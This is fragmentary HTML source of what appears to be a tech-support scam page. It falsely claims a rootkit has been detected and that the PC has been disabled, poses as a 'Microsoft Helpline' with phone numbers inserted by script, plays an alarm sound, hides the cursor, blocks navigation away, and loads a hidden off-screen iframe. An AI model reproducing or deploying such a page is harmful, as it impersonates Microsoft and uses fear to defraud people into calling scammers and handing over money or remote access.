...
<html lang="en">
  <head>
  <script defer data-domain="capital.com" src="https://plausible.io/js/script.manual.js"></script>
...
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-228316669-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-228316669-3');
</script>
        <meta charset="utf-8">
...
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-DT0J65BHT2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-DT0J65BHT2');
</script>
<script>
setTimeout(function () {
...
<script type="text/javascript">
 $(document).ready(function() {
    ...
    audioElement.setAttribute('src', '09xhrk0786xalr09.mp3');
...
<script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>
    ...
    <body id="mycanvas" onclick="showDiv()" onbeforeunload="return myFunction()" style="overflow: hidden;cursor:none;">
      ...
      <div style="position:absolute; top:40px; right:45px; z-index:99999;"><h3 style="font-size:22px; font-weight:bold; ">Call Microsoft Helpline <script>document.write(phone_number2);</script></h3></div>
    ...
    top: 5px;">Microsoft</span> <p style="font-weight: 600;">Contact Helpline</p>
        ...
        <source src="9xhrk0786xalr09.mp3" type="audio/mpeg">
        </audio>
  ...
  <div class="row firewall-pro">
    ...
    <h2 style="font-size:16px;font-weight:bold;">!!Rootkit!! Malware Detected</h2>
    <p>Access To This PC Has Been Disabled For Security Reasons.</p>
    <h2 style="font-size:21px; font-weight:bold;">Call Microsoft Helpline: <script>document.write(phone_number);</script></h2>
  ...
  if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
    {
       ...
       function msg_ff() {
            ...
            i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="W810DE10.php"></iframe></div>';
